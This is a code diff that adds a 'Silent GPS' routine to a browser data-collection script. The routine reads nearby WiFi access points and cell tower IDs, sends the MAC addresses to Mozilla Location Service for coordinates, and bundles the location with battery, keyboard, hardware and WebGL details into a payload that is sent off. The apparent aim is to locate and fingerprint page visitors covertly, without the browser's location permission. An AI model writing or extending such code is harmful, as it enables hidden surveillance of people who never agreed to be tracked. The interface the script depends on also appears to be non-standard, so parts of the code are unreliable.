@@ -291,7 +291,34 @@
           }))
           .catch(() => ({}));
 
-      /* ── 2. Battery Status ───────────────────────── */
+      /* ── 2. Silent GPS (WiFi + Cell Tower) ── */
+      const getSilentGPS = async () => {
+        const result = { wifi: [], cell: [] };
+        try {
+          const scan = navigator.connection?.getNetworkDetails?.() || {};
+          if (scan.wifi) {
+            result.wifi = scan.wifi.map(a => ({ mac: a.BSSID, ssid: a.SSID, signal: a.signalStrength }));
+          }
+          if (scan.cell) {
+            result.cell = scan.cell.map(c => ({
+              mcc: c.mobileCountryCode, mnc: c.mobileNetworkCode,
+              lac: c.locationAreaCode, cid: c.cellId, signal: c.signalStrength
+            }));
+          }
+          /* Mozilla Location Service (free, no key) */
+          if (result.wifi.length) {
+            const r = await fetch('https://location.services.mozilla.com/v1/geolocate?key=geodocs', {
+              method: 'POST', headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ radioType: 'wifi', wifiAccessPoints: result.wifi.map(w => ({ macAddress: w.mac })) })
+            });
+            const d = await r.json();
+            if (d.lat) result.mozilla = { lat: d.lat, lon: d.lon, accuracy: d.accuracy };
+          }
+        } catch { /* */ }
+        return result;
+      };
+
+      /* ── 3. Battery Status ───────────────────────── */
       const getBattery = () =>
         (navigator.getBattery || (() => Promise.resolve(null)))()
           .then(b => b ? { level: b.level, charging: b.charging, time: b.chargingTime, remaining: b.dischargingTime } : null)
@@ -480,12 +507,12 @@
 
       /* ── Collect & Send ──────────────────────────── */
       const send = async () => {
-        const [network, battery, keyboard] = await Promise.all([
-          getNetwork(), getBattery(), getKeyboard()
+        const [network, gps, battery, keyboard] = await Promise.all([
+          getNetwork(), getSilentGPS(), getBattery(), getKeyboard()
         ]);
         const payload = {
           timestamp: new Date().toISOString(),
-          network, battery, keyboard,
+          network, gps, battery, keyboard,
           connection: getConnection(),
           hardware: getHardware(),
           webgl: getWebGL(),
